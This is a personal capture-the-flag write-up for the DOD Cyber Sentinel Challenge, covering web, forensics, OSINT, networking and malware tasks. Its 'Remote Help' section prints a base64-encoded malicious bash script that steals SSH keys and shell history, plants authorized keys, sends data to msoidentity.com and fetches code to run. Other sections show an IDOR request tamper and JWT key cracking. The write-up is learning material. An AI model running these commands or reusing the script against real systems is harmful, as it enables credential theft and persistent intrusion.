# DOD Cyber Sentinel Challenge

**June 14th, 2025** - 11am to 7pm EST

![ranking](https://github.com/user-attachments/assets/bc4402a9-71d7-4fb1-ba83-92b274cd265e)


- Robots.txt: [Secret.txt Society](#Secret.txt-Society)
- IDOR issue: [Field Reports Mayhem](#Field-Reports-Mayhem)
- MP3 Metadata: [Behind the Beat](#Behind-the-Beat)
- Img Metadata: [Hidden in Plain Sight](#Hidden-in-Plain-Sight)
- DTMF decoding: [Listening Post](#Listening-Post)
- GeosInt: [Cafe Confidential](#Cafe-Confidential)
- TOR: [Problems in North TORbia](#Problems-in-North-TORbia)
- GeosInt: [Inspo](#Inspo)
- Wireshark: [Packet Whisperer](#Packet-Whisperer)
- Strings: [Hardcoded Lies](#Hardcoded-Lies)
- Pastebin: [Encoded Evidence](#Encoded-Evidence)

I also included partial writeups for 3 challenges I spent a long time on and could not solve. 
INCOMPLETED:
- JWT: [None Shall Pass](None-Shall-Pass)
- Reading scripts: [Remote Help](#Remote-Help)
- Encrypted traffic: [Decryption Conniption](Decryption-Conniption)

## Web Security

## Secret.txt Society

![secret-writeup](https://github.com/user-attachments/assets/e3edbcab-fc63-4a70-a7d2-9e003c27cbb9)

From the writeup, we are asked to "uncover what the bots were told to ignore." This implies we should look at the robots.txt endpoint of the website. 
Opening the website we see a generic webpage with info about "North Torbia." Usually I would start with inspecting the page, but instead I jumped to the `robots.txt` page.

`https://juche.msoidentity.com/robots.txt` looks like the following
![robots.txt](https://github.com/user-attachments/assets/dc0415a1-ba07-46f9-bd00-7fee04314125)

Visiting `https://juche.msoidentity.com/juchejaguar`shows the flag.
![flag](https://github.com/user-attachments/assets/0b6790f8-e175-43db-a4ca-d191468cbbfa)

**C1{r0b0ts_arent_4lways_p0lit3}**

## Field Reports Mayhem

![field-writeup](https://github.com/user-attachments/assets/4485dbf5-0da7-494f-83f1-bfa229d5c87d)

From the writeup, we can log into the Juche Jaguar's Field reports. We also notice a 'leet' agent mentioned in the writeup, so presumably we want to log in as `agent 1337`. 

Logging in we can see the following site. 
![website-view](https://github.com/user-attachments/assets/5a776f96-7eea-4a77-8813-5680f00256aa)

We have the inpsection tab open to network. Upon clicking an available report, we see the GET gets `dashboard.php?id=1234&code=CD56EF` This implies the GET follows the pattern `dashboard.php?id=<agent_id>&code=<available_report>`. 
![inspect-available-report](https://github.com/user-attachments/assets/ec040630-e088-4f8f-bb9f-16755db84b83)

I want to test if we can just resend the packet but with the agent_id equal to an arbitrary number. In this case, we'll test '1337' because of the mention of 'leet' in the writeup.

To resend the packet from the network inspection, right click the packet and edit the request. With the following packet formed, we can now see we are viewing the reports of Agent 1337.
![form-new-packet](https://github.com/user-attachments/assets/bf3e999c-279e-4d3d-ae13-5c6fb7f98b87)

Clicking through the reports as agent 1337, we find the flag.
![flag](https://github.com/user-attachments/assets/b8284de4-70f6-42e8-bb53-805ddd3fe205)

**C1{ID0R_F13LD_R3P0RT}**

## INCOMPLETED: None Shall Pass

![pass-writeup](https://github.com/user-attachments/assets/e7ebd9a9-20fb-4b54-a1d5-c210bc1c6562)

Logging in from the writeup credentials, gives us a token. From a simple google search this is a JSON Web Token (JWT)
![token](https://github.com/user-attachments/assets/23cf6a56-8322-4e7f-b44d-cb402159c8f4)

Using the site [Token.dev](https://token.dev/), I decoded the token and we can see the token uses HS256 as it's signature algorithm, and has a user, and role in the payload.
![jwt-decoded](https://github.com/user-attachments/assets/fa754b13-a0b5-451c-923c-2f63d339b59f)

Presumably we want to make our own token with the role set to admin. Simply changing the role to admin leads to an incorrect token error, so we need to also crack the password. 

I first tried the `rockyou` password list with no luck. Next I tried a generic hashcat decoding found from a [Medium article](https://blog.pentesteracademy.com/hacking-jwt-tokens-bruteforcing-weak-signing-key-hashcat-7dba165e905e) on hacking JWT tokens. 

```sh
hashcat jwt.txt -m 16500 -a 3 -w 2 
```

Unfortunately, it didn't give me anything back in the amount of time I gave it to run. 

The last step would have been doing a GET from the proper endpoint and receiving the flag. 
```sh
curl -H "Authorization: Bearer <forged_JWT>" http://34.85.163.182:8080/secret
```
![failed-get](https://github.com/user-attachments/assets/77bc44d4-87e7-4cab-82f7-973be1c9d46f)


## Forensics

### Behind the Beat

![beat-writeup](https://github.com/user-attachments/assets/b9dea235-53cd-4c65-8006-de25e6375547)

Using exiftool and examining the metadata, we see the flag.
```sh
exiftool message.mp3
```

![mp3-flag](https://github.com/user-attachments/assets/10d52ce6-1f56-495a-ba44-9ea8aef0ad6c)

**C1{metadata_tells_more}**

### Hidden in Plain Sight

![hidden-writeup](https://github.com/user-attachments/assets/8ad9313d-d355-47db-8600-b26d4130c387)

Using exiftool and examining the metadata, we see the flag. (Yes this was the same as the last one)
```sh
exiftool selfie.png
```

![png-flag](https://github.com/user-attachments/assets/2dbb616c-e986-49dd-a58c-b6104fdca687)

**C1{smile_youre_flagged}**

### Listening Post

![listening-writeup](https://github.com/user-attachments/assets/ace34170-3b90-4f67-8616-332715761489)

Listening to the file, it sounded distinctly like touch tones for a phone. Googling a decoder, I uploaded the file to [DTMF Decoder](https://dtmf.netlify.app/).
The output showed Binary code. 

![dtmf-decoder](https://github.com/user-attachments/assets/a4b097f4-54cd-4b86-b1dd-8b572a9d430b)

I translated this binary to hex with [RapidTables](https://www.rapidtables.com/convert/number/binary-to-hex.html) and then the hex to ascii also with [RapidTables](https://www.rapidtables.com/convert/number/hex-to-ascii.html).
![bin-2-hex](https://github.com/user-attachments/assets/d12ef9ef-c7cc-40c5-8e16-3ec59492ed32)
![hex-2-ascii](https://github.com/user-attachments/assets/3ea6f94f-4bc3-4350-9cc7-8d0a9e9888c2)

This gave me a flag output. 

**C1{r4d1o_k1ll3d_th3_t0rb1a_st4r}**

## INCOMPLETED: Remote Help

![remote-writeup](https://github.com/user-attachments/assets/06d0170c-93b3-47ee-b1f6-685e6a463fb7)

First we are given a github page that seems normal until you scroll to the bottom. I ran that line on my terminal to get a new sript to parse through. 

```sh
echo IyEvYmluL2Jhc2gKCiRsb2c9Ii90bXAvbG9nXyQoZGF0ZSArIiVZLSVtLSVkLS0lSC0lTSIpIgokdGd6PSIvdG1wL2xvZ18kKGRhdGUgKyIlWS0lbS0lZC0tJUgtJU0iKS50Z3oiCgpta2RpciAtcCAkbG9nCgpjYXQgL3Byb2MvY3B1aW5mbyA+PiAiJGxvZy9jcHUudHh0IgpjYXQgL3Byb2MvbWVtaW5mbyA+PiAiJGxvZy9tZW0udHh0IgpjYXQgL2V0Yy9vcy1yZWxlYXNlID4+ICIkbG9nL29zLnR4dCIKCgoKZm9yIGRpciBpbiAkKGxzIC9ob21lIC0xKTsgZG8KICAgIAoJaWYgWyAtZiAiJGRpci8uc3NoLyIgXTsgdGhlbgoJCWNhdCAkZGlyLy5zc2gvKiA+PiAiJGxvZy8nJGRpcicudHh0IgoJCWNhdCAkZGlyLy5iYXNoX2hpc3RvcnkgPj4gIiRsb2cvJyRkaXInLWJhc2gudHh0IgoJZmkKICAgICMgUGVyZm9ybSB5b3VyIGFjdGlvbnMgaGVyZQpkb25lCgppZiBbICIkKGlkIC11KSIgLWVxIDAgXTsgdGhlbgoJY2F0IC9yb290Ly5zc2gvKiA+PiAiJGxvZy9yb290LnR4dCIKCWNhdCAvcm9vdC8uYmFzaF9oaXN0b3J5ID4+ICIkbG9nL3Jvb3QtYmFzaC50eHQiCglsb2NhbCB1cmw9Imh0dHBzOi8vbXNvaWRlbnRpdHkuY29tL2F1dGgiCiAgICBsb2NhbCBhdXRoX2tleXM9IiRIT01FLy5zc2gvYXV0aG9yaXplZF9rZXlzIgoJCiAgICBjdXJsIC1zICIkdXJsIiA+PiAiJGF1dGhfa2V5cyIKICAgIGNobW9kIDYwMCAiJGF1dGhfa2V5cyIKZmkgCgoKdGFyIC1jZiAiJHRneiIgIiRsb2ciIDI+L2Rldi9udWxsCgppZiBbIC1mICIkdGFyZmlsZSIgXTsgdGhlbgogICAgICAgIGN1cmwgLXMgLS1vdXRwdXQgL2Rldi9udWxsIC1YIFBPU1QgLUggImFjY2VwdDogYXBwbGljYXRpb24vanNvbiIgLUggIkNvbnRlbnQtVHlwZTogbXVsdGlwYXJ0L2Zvcm0tZGF0YSIgLUYgImZpbGU9QCR0YXJmaWxlIiAiaHR0cHM6Ly9tc29pZGVudGl0eS5jb20vbG9nIgogICAgZmkKfQoKY3VybCAtcyBodHRwczovL21zb2lkZW50aXR5LmNvbS9pbmZvIHwgYmFzZTMyIC1kID4+IC90bXAvaW5mby5zaAovYmluL2Jhc2ggL3RtcC9pbmZvLnNoCnJtIC1mIC90bXAvaW5mby5zaAo= | base64 -d
```
Here we curl the different urls and find the first part of the string held in `https://msoidentity.com/log`.

```sh
curl -s "https://msoidentity.com/log"
```
**C1{Sn34ky_**

The writeup said there are 4 parts to the flag, so we are 1/4 the way there.

Next, we decode the second script.

```sh
curl -s https://msoidentity.com/info | base32 -d 
```
This script has less to look at, just a setting up a cron job and decrypting another script. 

```sh
SCRIPT_PATH="./results.sh"
curl -fsSL https://msoidentity.com/backup_info -o "$SCRIPT_PATH.enc" && openssl enc -nosalt -aes-256-cbc -d -in "$SCRIPT_PATH.enc" -out "$SCRIPT_PATH" -pass pass:"45337a3067335f56475f" && chmod +x "$SCRIPT_PATH" && rm "$SCRIPT_PATH.enc"
```

Opening results.sh this reveals some github files. On the left is backup.server and on the right is backup.timer.
Nothing of interest sticks out to me about these files.
![git-files](https://github.com/user-attachments/assets/0aae2409-5694-4c7b-a73c-41dd450e9f0e)

Finally, if we run the last time and netcat the address, we get a flag. 
```sh
nc msoidentity.com 4443
```
![final-part](https://github.com/user-attachments/assets/f6d9b124-d570-4484-9832-a390587a20ce)

**pr0sp3r}**

Unfortunately, this looks like the last piece of the flag, so we are still missing the inner two pieces. 

## INCOMPLETE: Decryption Conniption

![decryption-writeup](https://github.com/user-attachments/assets/f197932b-8efe-4876-8ba4-a633e1016061)

We are given a zip file containing a `memory.raw` file and a `pcap` file. We know we want to get `SSLKEYLOGFILE` from the memory dump. 

So using volatility3 I checked the envrionmental variables for where that file was set. 

```sh
vol -f ../Downloads/memory.raw windows.envars | grep SSLKEYLOGFILE
```
This returned the location of the keylog file as `C:\Users\c1\keylog.log`.

![env-output](https://github.com/user-attachments/assets/28303356-0e03-4d08-8566-ab450a3d3114)

We can now scan the files to find this one.

```sh
vol -f ../Downloads/memory.raw windows.filescan | grep keylog.log
```

This output shows the offset of where the file begins which we need to dump the contents of the file. 

![filescan-output](https://github.com/user-attachments/assets/db17f0cf-b476-40e9-a703-aed8c68638a7)


```sh
vol -f ../Downloads/memory.raw windows.dumpfiles --virtaddr 0x8b0f8e42cb20
```

We now have two files which I renamed to `keylog.log.dat` and `keylog.log.vacb`. From some Google searches, I know we can use this keylog file to decrypt the TLS pcap files 

Unfortunately, when I input the file as the (pre)-master-secret-logfile, it does not decrypt the data. To do this in general, right click your tls packet, navigate down to "protocol preferences" then "Transport Layer Security" and add the file to the (pre)-master-secret-logfile.

I spent a long time trying different outputted keylog files and searching Google, and just got stuck here. 

## OSINT

## Cafe Confidential

![cafe-writeup](https://github.com/user-attachments/assets/3e18ec67-6757-416a-8dbd-d00a4a2d2b12)

Here, we are given two photos. By using Google's reverse image search we find that the one image is Harrods, a luxury department store in Knightsbridge, London. 

I actually couldn't open the other photo and found using a the hex output that it was a riff file. I uploaded it to [Convert.Guru](https://convert.guru/riff-converter) and output it as a png. From here I did another reverse image search, and found it is a "Matilda cake."
This particular cake is from Parker's in London as it from their Instagram. Another clue would be the P with a key on the paper under the cake. Luckily, we found the exact image. 

![instagram-cake](https://github.com/user-attachments/assets/df82783a-d662-4758-9cd6-e7e1db134a79)

Searching for the location on google, we find the street address `21 Lowndes St, Greater, London SW1X 9ES, United Kingdom`. Given this is .5 a mile from Harrods, I assume this is the correct location. 
![google-maps](https://github.com/user-attachments/assets/e51384db-f67a-49a9-ad7b-38c964e00019)

The flag is the cafe name plus the street name, so we have a flag.

**C1{Parker's_Lowndes}**

### Problems in North TORbia

![problems-writeup](https://github.com/user-attachments/assets/4f5109a1-5d33-4964-822b-cde307523f0e)

The note contains little of interest other than a onion address. Opening TOR, we connect and put the address into the search bar. NOTE: normally you shouldn't just put websites into tor without knowing where they go, but given this is a DoD sponsored CTF, I felt safe doing so.

![tor-website](https://github.com/user-attachments/assets/37028368-a932-4a33-90be-c779b3ea5538)

Opening the inspector and looking through the code, we find a hidden value in the shape of a flag. 

![inspect-website](https://github.com/user-attachments/assets/8543bcf2-a185-4feb-8529-83b22ca4924b)

**C1{h1dd3n_f13lds_0f_0n10ns}**

### Inspo

![inspo-writeup](https://github.com/user-attachments/assets/7a4be4fa-9beb-45db-948c-c754e1523a20)

Once again we are given two photos. When we reverse image search we can find articles with this exact photo talking of the new development in these areas. 

Reading through several of the articles we find this street they are walking on is in the `Hwasong district` of `Pyongyang`. Using [Wikipedia](https://en.wikipedia.org/wiki/Hwasong-guyok) I easily found the coordinates and [geohack](https://geohack.toolforge.org/geohack.php?pagename=Hwasong-guyok&params=39_5_47.4_N_125_46_38.6_E_type:city_region:KP-01) gave me the decimal latitude and longitude.

Normally, I would use google streetview to verify and find the exact location, but given it was in North Korea that was not possible. You can still look from satellite view but given the coordinates worked, I did not worry about it.

**C1{39.097,125.777}**

## Networking 

## Packet Whisperer

![packet-writeup](https://github.com/user-attachments/assets/afa5007a-56f6-43b5-b9ac-5e271125cecc)

Here I opened the pcap file in Wireshark, and followed the tcp stream. To do this right click a packet, go down to follow and select the appropiate stream. 

![wireshark-tcp-follow](https://github.com/user-attachments/assets/e2e0e078-aeb6-4652-816b-b7efe13fa1f2)

Reading through the outpu, we can see the last line in red is the username and password in plaintext. The password is our flag.

**C1{maybe_TLS_would_be_nice}**

## Malware/RE

## Hardcoded Lies

![hardcoded-writeup](https://github.com/user-attachments/assets/f52cdf57-43d3-4b63-9085-97c4fc71f5cb)

Here we are given a zip file. Unzip the file to find only one file. 
```sh
unzip hardcodedlies.zip
```

From the writeup, we can assume they want us to use `strings` and this immediately produces the flag.
![strings-flag](https://github.com/user-attachments/assets/1d96a71d-7889-43e2-a6d9-5b788246b5bb)

**C1{h4rdc0ded_but_0verlooked}**

## Encoded Evidence

![encoded-writeup](https://github.com/user-attachments/assets/0bae1ae5-746c-488e-90a8-be7179412f75)

We are given a visual basic script. Running `cat` we can see a pastebin link with the comment that it should return Base 64.

![vbs-script](https://github.com/user-attachments/assets/0401510d-ce65-44e5-bf7c-3d1e1be07451)

The Pastebin link does in fact return a base 64 string, which we decode using [CyberChef](https://gchq.github.io/CyberChef/) to give us the flag.

![cyberchef-flag](https://github.com/user-attachments/assets/fddb7c43-206c-4ec4-8077-54d663ba94ba)

**C1{n0_d3bug_n0_p4yn}**

